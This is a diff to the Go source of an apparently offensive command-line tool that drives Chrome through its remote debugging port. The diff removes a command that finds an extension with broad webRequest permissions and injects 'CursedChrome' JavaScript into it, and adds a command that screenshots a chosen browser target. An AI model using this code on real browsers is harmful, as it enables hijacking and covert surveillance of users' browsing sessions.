@@ -20,6 +20,7 @@ package cmd
 
 import (
 	"fmt"
+	"io/ioutil"
 	"net/url"
 	"os"
 
@@ -27,14 +28,9 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var (
-	cursedChromePermissions    = []string{overlord.AllURLs, overlord.WebRequest, overlord.WebRequestBlocking}
-	cursedChromePermissionsAlt = []string{overlord.AllHTTP, overlord.AllHTTPS, overlord.WebRequest, overlord.WebRequestBlocking}
-)
-
-var curseCmd = &cobra.Command{
-	Use:   "curse",
-	Short: "Inject CursedChrome",
+var screenshotCmd = &cobra.Command{
+	Use:   "screenshot",
+	Short: "Screenshot a Chrome context",
 	Long:  ``,
 	Run: func(cmd *cobra.Command, args []string) {
 		debuggingPort, err := cmd.Flags().GetInt(remoteDebuggingPortFlagStr)
@@ -46,8 +42,12 @@ var curseCmd = &cobra.Command{
 			fmt.Printf(Warn+"Invalid port number %d\n", debuggingPort)
 			os.Exit(ExitBadFlag)
 		}
-		_, verbose := getOutputFlags(cmd)
-		jsCode := getJSCode(cmd)
+		targetID, err := cmd.Flags().GetString(targetIDStrFlag)
+		if err != nil {
+			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", targetIDStrFlag, err)
+			os.Exit(ExitBadFlag)
+		}
+		// format, _ := getOutputFlags(cmd)
 
 		debugURL := url.URL{
 			Scheme: "http",
@@ -55,41 +55,32 @@ var curseCmd = &cobra.Command{
 			Path:   "/json",
 		}
 
-		// Find with primary permissions
-		if verbose {
-			fmt.Printf(Info+"Looking for extension with %v\n", cursedChromePermissions)
-		}
-		target, err := overlord.FindExtensionWithPermissions(debugURL.String(), cursedChromePermissions)
+		targets, err := overlord.QueryDebugTargets(debugURL.String())
 		if err != nil {
 			fmt.Printf(Warn+"%s\n", err)
 			os.Exit(ExitDebugQueryError)
 		}
-		if verbose {
-			fmt.Printf(Info+"Found %v\n", target)
-		}
-		if target == nil {
-			if verbose {
-				fmt.Printf(Info+"Looking for extension with %v\n", cursedChromePermissionsAlt)
-			}
-			// Look for alternate permissions
-			target, err = overlord.FindExtensionWithPermissions(debugURL.String(), cursedChromePermissionsAlt)
-			if err != nil {
-				fmt.Printf(Warn+"%s\n", err)
-				os.Exit(ExitDebugQueryError)
-			}
-			if verbose {
-				fmt.Printf(Info+"Found %v\n", target)
+
+		found := false
+		result := []byte{}
+		for _, target := range targets {
+			if target.ID == targetID {
+				result, err = overlord.Screenshot(target.WebSocketDebuggerURL, targetID, 100)
+				if err != nil {
+					fmt.Printf(Warn+"Failed to take screenshot %s\n", err)
+					os.Exit(ExitTaskFailure)
+				}
+				found = true
+				break
 			}
 		}
-		if target == nil {
-			fmt.Println(Warn + "No valid injection targets found.")
+		if !found {
+			fmt.Printf(Warn+"Target '%s' not found\n", targetID)
 			os.Exit(ExitTargetNotFound)
 		}
-
-		_, err = overlord.ExecuteJS(target.WebSocketDebuggerURL, target.ID, jsCode)
-		if err != nil {
-			fmt.Printf(Warn+"%s\n", err)
-			os.Exit(ExitExecuteJSError)
+		if err := ioutil.WriteFile("overlord.png", result, 0o644); err != nil {
+			fmt.Printf(Warn+"File write failed %s\n", err)
+			os.Exit(999)
 		}
 	},
 }
